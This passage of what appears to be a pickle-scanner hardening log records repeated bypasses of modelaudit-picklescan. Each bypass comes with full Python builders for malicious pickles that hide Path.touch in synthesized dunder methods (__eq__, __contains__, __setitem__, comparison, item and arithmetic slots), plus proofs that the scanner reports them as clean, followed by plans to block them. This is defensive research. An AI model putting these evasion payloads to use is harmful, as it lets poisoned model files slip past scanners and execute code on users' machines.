    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_eq_dunder_eq_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        s("__eq__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R\x940",
        sg("operator", "eq"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=158`, `bytes_total=158`, `opcode_count=34`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.eq`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `operator.eq` call returns
  a `DerivedPath` instance at `/tmp/ma_operator_eq_dunder_eq_marker` and does
  not create the marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_eq_dunder_eq_marker` and returns `None`
- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
  subclass with `__eq__ = pathlib.Path.touch`. Calling
  `operator.eq(instance, 0o666)` dispatches to `instance.__eq__(0o666)`, which
  calls `Path.touch(instance, mode=0o666)` before `pickle.loads()` returns.
  Rich comparison methods may return arbitrary objects, so the `None` return
  from `Path.touch` does not raise.

Why the scanner missed it:

- `__eq__` is not in the suspicious magic-method string list. Current coverage
  includes serialization hooks, attribute hooks, `__call__`, and `__del__`, but
  not rich-comparison hooks.
- `operator.eq` is absent from `DANGEROUS_GLOBALS`; current `operator`
  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The payload uses only currently clean globals: `builtins.type`,
  `pathlib.PosixPath`, `pathlib.Path.touch`, and `operator.eq`.
- The dangerous callable is hidden as a synthesized rich-comparison method, so
  the final visible call target is a common comparison helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`,
  `__getattribute__`, or `__del__`.

Performance note: this is a precise magic-method seed gap. The focused next
block should add `__eq__` to the suspicious magic-method string list, with an
oracle regression proving that class construction alone does not create the
marker but `operator.eq(instance, 0o666)` does. This keeps the hot path to the
existing string-literal policy scan and avoids rich-comparison flow modeling.

## Turn 82 - Block `__eq__` rich-comparison seeds

Blocking plan:

- Add `__eq__` to the existing suspicious magic-method string list. Equality
  hooks can route execution through rich-comparison dispatch rather than an
  explicit dangerous call target.
- Leave `operator.eq`, `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed for this focused block. The static signal is the
  attacker-controlled rich-comparison slot name.
- Add a CPython oracle regression that builds the manual
  `type(..., {"__eq__": Path.touch})` payload, verifies scan-time detection on
  both the construction-only control and `operator.eq` RCE variants, proves the
  control instance does not create the marker, then proves the equality check
  creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one literal in the existing magic-method match arm, no
rich-comparison flow modeling.

## Turn 83 - `__contains__` membership method gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using a clean membership helper
to invoke an attacker-controlled containment method during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_contains_dunder_contains_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        s("__contains__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R\x940",
        sg("operator", "contains"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=182`, `bytes_total=182`, `opcode_count=34`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.contains`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `operator.contains` call
  returns a `DerivedPath` instance at
  `/tmp/ma_operator_contains_dunder_contains_marker` and does not create the
  marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_contains_dunder_contains_marker` and returns `False`
- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
  subclass with `__contains__ = pathlib.Path.touch`. Calling
  `operator.contains(instance, 0o666)` dispatches to
  `instance.__contains__(0o666)`, which calls
  `Path.touch(instance, mode=0o666)`. Containment then coerces the `None`
  result to `False`, so the side effect happens before `pickle.loads()`
  returns without raising.

Why the scanner missed it:

- `__contains__` is not in the suspicious magic-method string list. Current
  coverage includes serialization hooks, attribute hooks, `__call__`,
  `__del__`, and `__eq__`, but not membership hooks.
- `operator.contains` is absent from `DANGEROUS_GLOBALS`; current `operator`
  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The payload uses only currently clean globals: `builtins.type`,
  `pathlib.PosixPath`, `pathlib.Path.touch`, and `operator.contains`.
- The dangerous callable is hidden as a synthesized containment method, so the
  final visible call target is a common membership helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`,
  `__getattribute__`, `__del__`, or `__eq__`.

Performance note: this is a precise magic-method seed gap. The focused next
block should add `__contains__` to the suspicious magic-method string list,
with an oracle regression proving that class construction alone does not
create the marker but `operator.contains(instance, 0o666)` does. This keeps
the hot path to the existing string-literal policy scan and avoids membership
flow modeling.

## Turn 84 - Block `__contains__` membership seeds

Blocking plan:

- Add `__contains__` to the existing suspicious magic-method string list.
  Membership hooks can route execution through containment dispatch rather
  than an explicit dangerous call target.
- Leave `operator.contains`, `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed for this focused block. The static signal is
  the attacker-controlled containment slot name.
- Add a CPython oracle regression that builds the manual
  `type(..., {"__contains__": Path.touch})` payload, verifies scan-time
  detection on both the construction-only control and `operator.contains` RCE
  variants, proves the control instance does not create the marker, then
  proves the membership check creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one literal in the existing magic-method match arm, no
membership-flow modeling.

## Turn 85 - `__setitem__` item-assignment method gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as the class `__setitem__` method.
- Instantiate the class with a marker path.
- Call `operator.setitem(instance, 0o666, True)` during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_setitem_dunder_setitem_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__setitem__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "setitem"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x88",
        b"\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Control scanner result: `len=153`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=179`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=179`, `bytes_total=179`,
  `opcode_count=35`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.setitem`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `operator.setitem` call
  returns a `DerivedPath` instance at
  `/tmp/ma_operator_setitem_dunder_setitem_marker` and does not create the
  marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_setitem_dunder_setitem_marker` and returns `None`

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with
  `__setitem__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `operator.setitem(instance, 0o666, True)` dispatches to
  `instance.__setitem__(0o666, True)`.
- Because `__setitem__` points at `Path.touch`, CPython calls
  `Path.touch(instance, mode=0o666, exist_ok=True)`. The file is created before
  `pickle.loads()` returns, and the visible result is just `None`.

Why the scanner missed it:

- `__setitem__` is not in the suspicious magic-method string list. Current
  coverage includes attribute hooks such as `__setattr__` and `__delattr__`,
  but not item-protocol hooks.
- `operator.setitem` is absent from `DANGEROUS_GLOBALS`; current `operator`
  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as an item-assignment method, so the final
  visible call target is a common mutator helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`,
  `__getattribute__`, `__del__`, `__eq__`, or `__contains__`.

Performance note: this is another precise magic-method seed gap. The focused
next block should add `__setitem__` to the suspicious magic-method string
list, with an oracle regression proving that class construction alone does not
create the marker but `operator.setitem(instance, 0o666, True)` does. That
keeps the hot path to one additional literal in the existing string policy and
avoids item-protocol flow modeling.

## Turn 86 - Block `__setitem__` item-assignment seeds

Blocking plan:

- Add `__setitem__` to the existing suspicious magic-method string list.
  Item-assignment hooks can route execution through mutation dispatch rather
  than an explicit dangerous call target.
- Leave `operator.setitem`, `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed for this focused block. The static signal is
  the attacker-controlled item-assignment slot name.
- Add a CPython oracle regression that builds the manual
  `type(..., {"__setitem__": Path.touch})` payload, verifies scan-time
  detection on both the construction-only control and `operator.setitem` RCE
  variants, proves the control instance does not create the marker, then
  proves item mutation creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one literal in the existing magic-method match arm, no
item-protocol flow modeling.

## Turn 87 - Ordering rich-comparison method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as an ordering rich-comparison method, for
  example `__lt__`.
- Instantiate the class with a marker path.
- Call the matching clean `operator` helper, for example
  `operator.lt(instance, 0o666)`, during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_lt_dunder_lt_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__lt__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "lt"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__lt__` representative:

- Control scanner result: `len=138`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=158`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=158`, `bytes_total=158`,
  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.lt`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `operator.lt` call returns
  a `DerivedPath` instance at `/tmp/ma_operator_lt_dunder_lt_marker` and does
  not create the marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_lt_dunder_lt_marker` and returns `None`

Sibling slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.lt` | `__lt__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.le` | `__le__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.gt` | `__gt__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ge` | `__ge__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ne` | `__ne__` | clean, 0 findings, 0 notices | marker created, returns `None` |

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
  rich-comparison slot such as `__lt__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `operator.lt(instance, 0o666)` dispatches to `instance.__lt__(0o666)`.
- Because `__lt__` points at `Path.touch`, CPython calls
  `Path.touch(instance, mode=0o666)`. Rich-comparison functions may return
  arbitrary Python objects, so the `None` result is returned normally after the
  file is created.

Why the scanner missed it:

- `__eq__` is in the suspicious magic-method string list, but the remaining
  rich-comparison slots `__lt__`, `__le__`, `__gt__`, `__ge__`, and `__ne__`
  are not.
- `operator.lt`, `operator.le`, `operator.gt`, `operator.ge`, and
  `operator.ne` are absent from `DANGEROUS_GLOBALS`; current `operator`
  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized rich-comparison method, so
  the final visible call target is a common comparison helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`,
  `__getattribute__`, `__del__`, `__contains__`, or `__setitem__`.

Performance note: the focused next block should add the remaining
rich-comparison slot names (`__lt__`, `__le__`, `__gt__`, `__ge__`, and
`__ne__`) to the suspicious magic-method string list. That keeps the hot path
to five additional literals in the existing string policy and avoids
rich-comparison flow modeling.

## Turn 88 - Block ordering rich-comparison seeds

Blocking plan:

- Add `__lt__`, `__le__`, `__gt__`, `__ge__`, and `__ne__` to the existing
  suspicious magic-method string list. These slots can route execution through
  rich-comparison dispatch without an explicit dangerous call target.
- Leave `operator.lt`, `operator.le`, `operator.gt`, `operator.ge`,
  `operator.ne`, `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed for this focused block. The static signal is
  the attacker-controlled rich-comparison slot name.
- Add a CPython oracle regression that builds
  `type(..., {"__lt__": Path.touch})`-style payloads for all five ordering
  slots, verifies scan-time detection on both construction-only controls and
  active `operator.*` RCE variants, proves the control instances do not create
  markers, then proves each comparison creates its marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: five literals in the existing magic-method match arm, no
rich-comparison flow modeling.

## Turn 89 - Item read/delete method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as an item-protocol method, for example
  `__getitem__`.
- Instantiate the class with a marker path.
- Call the matching clean `operator` helper, for example
  `operator.getitem(instance, 0o666)`, during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_getitem_dunder_getitem_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__getitem__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "getitem"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__getitem__` representative:

- Control scanner result: `len=153`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=178`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=178`, `bytes_total=178`,
  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.getitem`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `operator.getitem` call
  returns a `DerivedPath` instance at
  `/tmp/ma_operator_getitem_dunder_getitem_marker` and does not create the
  marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_getitem_dunder_getitem_marker` and returns `None`

Sibling slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.getitem` | `__getitem__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.delitem` | `__delitem__` | clean, 0 findings, 0 notices | marker created, returns `None` |

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
  item slot such as `__getitem__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `operator.getitem(instance, 0o666)` dispatches to
  `instance.__getitem__(0o666)`.
- Because `__getitem__` points at `Path.touch`, CPython calls
  `Path.touch(instance, mode=0o666)`. The file is created before
  `pickle.loads()` returns, and the visible result is just `None`.
- The `operator.delitem` variant follows the same pattern with
  `instance.__delitem__(0o666)`.

Why the scanner missed it:

- `__setitem__` is in the suspicious magic-method string list, but the
  read/delete item-protocol slots `__getitem__` and `__delitem__` are not.
- `operator.getitem` and `operator.delitem` are absent from
  `DANGEROUS_GLOBALS`; current `operator` coverage includes `call`,
  `attrgetter`, `itemgetter`, and `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized item method, so the final
  visible call target is a common item helper rather than the attacker-selected
  callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`,
  `__getattribute__`, `__del__`, `__contains__`, `__setitem__`, or rich
  comparison hooks.

Performance note: the focused next block should add `__getitem__` and
`__delitem__` to the suspicious magic-method string list. That keeps the hot
path to two additional literals in the existing string policy and avoids
item-protocol flow modeling.

## Turn 90 - Block item read/delete seeds

Blocking plan:

- Add `__getitem__` and `__delitem__` to the existing suspicious magic-method
  string list. Item read/delete hooks can route execution through item
  protocol dispatch without an explicit dangerous call target.
- Leave `operator.getitem`, `operator.delitem`, `builtins.type`,
  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused block.
  The static signal is the attacker-controlled item-protocol slot name.
- Add a CPython oracle regression that builds
  `type(..., {"__getitem__": Path.touch})`-style payloads for both item
  read/delete slots, verifies scan-time detection on both construction-only
  controls and active `operator.*` RCE variants, proves the control instances
  do not create markers, then proves each item operation creates its marker
  during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: two literals in the existing magic-method match arm, no
item-protocol flow modeling.

## Turn 91 - Binary arithmetic method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as a binary arithmetic method, for example
  `__add__`.
- Instantiate the class with a marker path.
- Call the matching clean `operator` helper, for example
  `operator.add(instance, 0o666)`, during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_add_dunder_add_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__add__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "add"),
        b"h\x01",
        b"M" + (0o666).to_bytes(2, "little"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__add__` representative:

- Control scanner result: `len=141`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=162`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=162`, `bytes_total=162`,
  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.add`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `operator.add` call returns
  a `DerivedPath` instance at `/tmp/ma_operator_add_dunder_add_marker` and does
  not create the marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_add_dunder_add_marker` and returns `None`

Sibling slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.add` | `__add__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.sub` | `__sub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.mul` | `__mul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.matmul` | `__matmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.truediv` | `__truediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.mod` | `__mod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.pow` | `__pow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.lshift` | `__lshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.rshift` | `__rshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.and_` | `__and__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.xor` | `__xor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.or_` | `__or__` | clean, 0 findings, 0 notices | marker created, returns `None` |

`__floordiv__` was not counted as a clean bypass in this probe because the
existing nested-raw-pickle heuristic already made that exact payload
`malicious`.

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
  binary operator slot such as `__add__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `operator.add(instance, 0o666)` dispatches to `instance.__add__(0o666)`.
- Because `__add__` points at `Path.touch`, CPython calls
  `Path.touch(instance, mode=0o666)`. Binary operator methods may return
  arbitrary Python objects, so the `None` result is returned normally after the
  file is created.

Why the scanner missed it:

- Arithmetic and bitwise dunder slots such as `__add__`, `__sub__`,
  `__mul__`, `__matmul__`, `__truediv__`, `__mod__`, `__pow__`,
  `__lshift__`, `__rshift__`, `__and__`, `__xor__`, and `__or__` are absent
  from the suspicious magic-method string list.
- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
  `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized binary operator method, so
  the final visible call target is a common arithmetic helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, attribute hooks, item hooks,
  containment hooks, or rich-comparison hooks.

Performance note: the focused next block should add the clean-bypassing binary
operator slot names to the suspicious magic-method string list. That keeps the
hot path to a fixed set of additional literal matches and avoids arithmetic
flow modeling.

## Turn 92 - Block binary arithmetic seeds

Blocking plan:

- Add the clean-bypassing binary arithmetic and bitwise dunder slots to the
  existing suspicious magic-method string list: `__add__`, `__sub__`,
  `__mul__`, `__matmul__`, `__truediv__`, `__mod__`, `__pow__`,
  `__lshift__`, `__rshift__`, `__and__`, `__xor__`, and `__or__`.
- Leave the corresponding `operator` helpers, `builtins.type`,
  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused
  block. The static signal is the attacker-controlled binary operator slot
  name.
- Add a CPython oracle regression that builds
  `type(..., {"__add__": Path.touch})`-style payloads for all 12 clean
  bypassing slots, verifies scan-time detection on both construction-only
  controls and active `operator.*` RCE variants, proves the control instances
  do not create markers, then proves each operator dispatch creates its marker
  during `pickle.loads()`.
- Do not add `__floordiv__` in this turn because the exact Turn 91 proof was
  already caught by the nested-raw-pickle heuristic rather than being a
  scanner-clean bypass.
- Add a changelog entry under `[Unreleased]`.

Performance note: twelve literals in the existing magic-method match arm, no
binary-operator flow modeling.

## Turn 93 - Reverse and in-place arithmetic method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as a reflected or in-place operator method, for
  example `__radd__` or `__iadd__`.
- Instantiate the class with a marker path.
- Call the matching clean `operator` helper during unpickling:
  `operator.add(0o666, instance)` for the reflected case or
  `operator.iadd(instance, 0o666)` for the in-place case.

Representative protocol 4 reflected payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_add_radd_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__radd__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "add"),
        b"M" + (0o666).to_bytes(2, "little"),
        b"h\x01",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Reflected `__radd__` control scanner result: `len=136`,
  `status=complete`, `verdict=clean`, `findings=[]`, `notices=[]`
- Reflected `__radd__` RCE scanner result: `len=157`, `status=complete`,
  `verdict=clean`, `findings=[]`, `notices=[]`
- In-place `__iadd__` control scanner result: `len=137`,
  `status=complete`, `verdict=clean`, `findings=[]`, `notices=[]`
- In-place `__iadd__` RCE scanner result: `len=159`, `status=complete`,
  `verdict=clean`, `findings=[]`, `notices=[]`
- Scanner import references for the reflected representative:
  `builtins.type`, `pathlib.PosixPath`, `pathlib.Path.touch`, and
  `operator.add`, all with `is_dangerous=False`
- Scanner import references for the in-place representative:
  `builtins.type`, `pathlib.PosixPath`, `pathlib.Path.touch`, and
  `operator.iadd`, all with `is_dangerous=False`
- Control proof: the construction-only pickle returns a `DerivedPath` instance
  and does not create the marker
- Unpickle result: the active payload creates its marker and returns `None`

Sibling reflected slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.add` | `__radd__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.sub` | `__rsub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.mul` | `__rmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.matmul` | `__rmatmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.truediv` | `__rtruediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.mod` | `__rmod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.pow` | `__rpow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.lshift` | `__rlshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.rshift` | `__rrshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.and_` | `__rand__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.xor` | `__rxor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.or_` | `__ror__` | clean, 0 findings, 0 notices | marker created, returns `None` |

Sibling in-place slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.iadd` | `__iadd__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.isub` | `__isub__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.imul` | `__imul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.imatmul` | `__imatmul__` | clean, 0 findings, 0 notices | marker created, returns `None` |
